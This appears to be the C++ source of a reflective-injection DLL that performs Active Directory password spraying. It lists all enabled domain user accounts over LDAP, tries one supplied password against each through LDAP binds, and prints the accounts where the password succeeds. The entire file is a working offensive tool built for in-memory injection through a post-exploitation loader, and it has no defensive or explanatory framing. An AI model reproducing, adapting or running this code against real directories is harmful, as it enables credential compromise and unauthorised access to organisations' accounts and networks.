#undef  _UNICODE
#define _UNICODE
#undef  UNICODE
#define UNICODE

#include "ReflectiveLoader.h"
#include <stdio.h>
#include <objbase.h>
#include <activeds.h>
#include <sddl.h>

#pragma comment(lib, "ADSIid.lib")
#pragma comment(lib, "ActiveDS.Lib")

// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
extern HINSTANCE hAppInstance;


int IS_BUFFER_ENOUGH(UINT maxAlloc, LPWSTR pszTarget, LPCWSTR pszSource, int toCopy = -1) {
	if (toCopy == -1) {
		toCopy = wcslen(pszSource);
	}

	return maxAlloc - (wcslen(pszTarget) + toCopy + 1);
}

HRESULT SprayUsers(IDirectorySearch *pContainerToSearch,	// IDirectorySearch pointer to Partitions container.
	LPCWSTR lpSprayPasswd)									// Password to Spray.
{
	if (!pContainerToSearch)
		return E_POINTER;

	// Calculate Program run time.
	LARGE_INTEGER frequency;
	LARGE_INTEGER start;
	LARGE_INTEGER end;
	double interval;

	QueryPerformanceFrequency(&frequency);
	QueryPerformanceCounter(&start);

	// Create search filter
	LPOLESTR pszSearchFilter = new OLECHAR[MAX_PATH * 2];
	if (!pszSearchFilter)
		return E_OUTOFMEMORY;
	wchar_t szFormat[] = L"(&(objectClass=user)(objectCategory=person)%s)";
	wchar_t szFilter[] = L"(!(userAccountControl:1.2.840.113556.1.4.803:=2))"; // Only enabled accounts

	// Check the buffer first
	if (IS_BUFFER_ENOUGH(MAX_PATH * 2, szFormat, szFilter) > 0)
	{
		// Add the filter.
		swprintf_s(pszSearchFilter, MAX_PATH * 2, szFormat, szFilter);
	}
	else
	{
		wprintf(L"[!] The filter is too large for buffer, aborting...");
		delete[] pszSearchFilter;
		return FALSE;
	}

	// Specify subtree search
	ADS_SEARCHPREF_INFO SearchPrefs;
	SearchPrefs.dwSearchPref = ADS_SEARCHPREF_PAGESIZE;
	SearchPrefs.vValue.dwType = ADSTYPE_INTEGER;
	SearchPrefs.vValue.Integer = 1000;
	DWORD dwNumPrefs = 1;

	// COL for iterations
	LPOLESTR pszColumn = NULL;
	ADS_SEARCH_COLUMN col;
	HRESULT hr;

	// Interface Pointers
	IADs *pObj = NULL;
	IADs *pIADs = NULL;

	// Handle used for searching
	ADS_SEARCH_HANDLE hSearch = NULL;

	// Set the search preference
	hr = pContainerToSearch->SetSearchPreference(&SearchPrefs, dwNumPrefs);
	if (FAILED(hr))
	{
		delete[] pszSearchFilter;
		return hr;
	}

	LPOLESTR pszBool = NULL;
	PSID pObjectSID = NULL;
	LPOLESTR szSID = NULL;
	LPOLESTR szDSGUID = new WCHAR[39];
	LPGUID pObjectGUID = NULL;
	LPWSTR pszPropertyList = { L"sAMAccountName" };
	DWORD dwAccountsTested = 0;
	DWORD dwAccountsFailed = 0;
	DWORD dwAccountsSuccess = 0;

	typedef struct _USER_INFO {
		WCHAR chuserPrincipalName[500][MAX_PATH];
	} USER_INFO, *PUSER_INFO;

	PUSER_INFO pUserInfo = (PUSER_INFO)calloc(1, sizeof(USER_INFO));

	int iCount = 0;
	DWORD x = 0L;

	if (!pszPropertyList)
	{
		// Return all properties.
		hr = pContainerToSearch->ExecuteSearch(pszSearchFilter,
			NULL,
			-1L,
			&hSearch);
	}
	else
	{
		// Return specified properties
		hr = pContainerToSearch->ExecuteSearch(pszSearchFilter,
			&pszPropertyList,
			sizeof(pszPropertyList) / sizeof(LPOLESTR),
			&hSearch);
	}

	if (SUCCEEDED(hr))
	{
		// Call IDirectorySearch::GetNextRow() to retrieve the next row of data
		hr = pContainerToSearch->GetFirstRow(hSearch);
		if (SUCCEEDED(hr))
		{
			while (hr != S_ADS_NOMORE_ROWS)
			{
				// Keep track of count.
				iCount++;
					
				// Loop through the array of passed column names, print the data for each column
				while (pContainerToSearch->GetNextColumnName(hSearch, &pszColumn) != S_ADS_NOMORE_COLUMNS)
				{
					hr = pContainerToSearch->GetColumn(hSearch, pszColumn, &col);
					if (SUCCEEDED(hr))
					{
						switch (col.dwADsType)
						{
							case ADSTYPE_DN_STRING:
							case ADSTYPE_CASE_EXACT_STRING:
							case ADSTYPE_CASE_IGNORE_STRING:
							case ADSTYPE_PRINTABLE_STRING:
							case ADSTYPE_NUMERIC_STRING:
							case ADSTYPE_TYPEDNAME:
							case ADSTYPE_FAXNUMBER:
							case ADSTYPE_PATH:
							case ADSTYPE_OBJECT_CLASS:
								for (x = 0; x < col.dwNumValues; x++) {
									if (_wcsicmp(col.pszAttrName, L"sAMAccountName") == 0) {
										if (dwAccountsTested > 0 && dwAccountsTested % 100 == 0) {
											wprintf(L"[*] Sprayed Accounts: %d\n", dwAccountsTested);
											fflush(stdout);
										}

										IADs *pObject = NULL;
										HRESULT hr = ADsOpenObject(L"LDAP://rootDSE",
											col.pADsValues->CaseIgnoreString,
											lpSprayPasswd,
											ADS_SECURE_AUTHENTICATION | ADS_FAST_BIND, // Use Secure Authentication
											IID_IADs,
											(void**)&pObject);
										if (FAILED(hr))
										{
											if (pObject)
												pObject->Release();

											dwAccountsFailed = dwAccountsFailed + 1;
											dwAccountsTested = dwAccountsTested + 1;
											break;
										}
										if (SUCCEEDED(hr))
										{
											wprintf(L"[+] Password correct for useraccount: %s\n", col.pADsValues->CaseIgnoreString);
											wcscpy_s(pUserInfo->chuserPrincipalName[dwAccountsSuccess], MAX_PATH, col.pADsValues->CaseIgnoreString);											
											if (pObject)
												pObject->Release();

											dwAccountsSuccess = dwAccountsSuccess + 1;
											dwAccountsTested = dwAccountsTested + 1;
											break;
										}
										else {
											break;
										}
									}
								}
								break;
							case ADSTYPE_BOOLEAN:
							case ADSTYPE_INTEGER:
							case ADSTYPE_OCTET_STRING:
							case ADSTYPE_UTC_TIME:
							case ADSTYPE_LARGE_INTEGER:
							case ADSTYPE_NT_SECURITY_DESCRIPTOR:
							default:
								wprintf(L"[!] Unknown type %d.\n", col.dwADsType);
						}

						pContainerToSearch->FreeColumn(&col);
					}
					CoTaskMemFree(pszColumn);
				}

				// Get the next row
				hr = pContainerToSearch->GetNextRow(hSearch);
			}
		}
		// Close the search handle to clean up
		pContainerToSearch->CloseSearchHandle(hSearch);
	}
	if (SUCCEEDED(hr) && 0 == iCount)
		hr = S_FALSE;

	if (dwAccountsSuccess >= 1) {
		wprintf(L"--------------------------------------------------------------------\n");
		wprintf(L"[+] Password correct for useraccount(s):\n");
		for (x = 0; x < 500; x++) {
			if (wcscmp(pUserInfo->chuserPrincipalName[x], L"") == 0) {
				break;
			}
			else {
				wprintf(L"    %s\r\n", pUserInfo->chuserPrincipalName[x]);
			}
		}
	}

	QueryPerformanceCounter(&end);
	interval = (double)(end.QuadPart - start.QuadPart) / frequency.QuadPart;

	wprintf(L"--------------------------------------------------------------------\n");
	wprintf(L"Program execution time: %0.2f seconds\n\n", interval);

	wprintf(L"Total AD accounts tested: %d\n", dwAccountsTested);
	wprintf(L"Failed Kerberos authentications: %d\n", dwAccountsFailed);
	wprintf(L"Successful Kerberos authentications: %d\n", dwAccountsSuccess);
	wprintf(L"--------------------------------------------------------------------\n");

	delete[] pszSearchFilter;
	return hr;
}


BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{
	BOOL bReturnValue = TRUE;
	LPWSTR pwszParams = (LPWSTR)calloc(strlen((LPSTR)lpReserved) + 1, sizeof(WCHAR));
	size_t convertedChars = 0;
	size_t newsize = strlen((LPSTR)lpReserved) + 1;

	switch (dwReason)
	{
	case DLL_QUERY_HMODULE:
		if (lpReserved != NULL)
			*(HMODULE *)lpReserved = hAppInstance;
		break;
	case DLL_PROCESS_ATTACH:
		hAppInstance = hinstDLL;

		if (lpReserved != NULL) {

			// Handle the command line arguments.
			mbstowcs_s(&convertedChars, pwszParams, newsize, (LPSTR)lpReserved, _TRUNCATE);

			// Initialize COM
			CoInitialize(NULL);
			HRESULT hr = S_OK;

			// Get rootDSE and the current user's domain container DN.
			IADs *pObject = NULL;
			IDirectorySearch *pContainerToSearch = NULL;
			LPOLESTR szPath = new OLECHAR[MAX_PATH];
			VARIANT var;
			hr = ADsOpenObject(L"LDAP://rootDSE",
				NULL,
				NULL,
				ADS_SECURE_AUTHENTICATION, // Use Secure Authentication
				IID_IADs,
				(void**)&pObject);
			if (FAILED(hr))
			{
				wprintf(L"[!] Could not execute query. Could not bind to LDAP://rootDSE.\n");
				if (pObject)
					pObject->Release();
				delete[] szPath;
				CoUninitialize();

				// Flush STDOUT
				fflush(stdout);

				// We're done, so let's exit
				ExitProcess(0);
			}
			if (SUCCEEDED(hr))
			{
				hr = pObject->Get(L"defaultNamingContext", &var);
				if (SUCCEEDED(hr))
				{
					// Build path to the domain container.
					wcscpy_s(szPath, MAX_PATH, L"LDAP://");
					if (IS_BUFFER_ENOUGH(MAX_PATH, szPath, var.bstrVal) > 0)
					{
						wcscat_s(szPath, MAX_PATH, var.bstrVal);
					}
					else
					{
						wprintf(L"[!] Buffer is too small for the domain DN");
						delete[] szPath;
						CoUninitialize();

						// Flush STDOUT
						fflush(stdout);

						// We're done, so let's exit
						ExitProcess(0);
					}

					hr = ADsOpenObject(szPath,
						NULL,
						NULL,
						ADS_SECURE_AUTHENTICATION, // Use Secure Authentication
						IID_IDirectorySearch,
						(void**)&pContainerToSearch);

					if (SUCCEEDED(hr))
					{
						hr = SprayUsers(pContainerToSearch, // IDirectorySearch pointer to Partitions container.
							pwszParams						// Password to Spray.
						);
						if (SUCCEEDED(hr))
						{
							if (S_FALSE == hr)
								wprintf(L"[!] No user object could be found.\n");
						}
						else if (0x8007203e == hr)
							wprintf(L"[!] Could not execute query. An invalid filter was specified.\n");
						else
							wprintf(L"[!] Query failed to run. HRESULT: %x\n", hr);
					}
					else
					{
						wprintf(L"[!] Could not execute query. Could not bind to the container.\n");
					}
					if (pContainerToSearch)
						pContainerToSearch->Release();
				}
				VariantClear(&var);
			}
			if (pObject)
				pObject->Release();

			delete[] szPath;

			// Uninitialize COM
			CoUninitialize();
		}

		// Flush STDOUT
		fflush(stdout);

		// We're done, so let's exit
		ExitProcess(0);
		break;
	case DLL_PROCESS_DETACH:
	case DLL_THREAD_ATTACH:
	case DLL_THREAD_DETACH:
		break;
	}
	return bReturnValue;
}
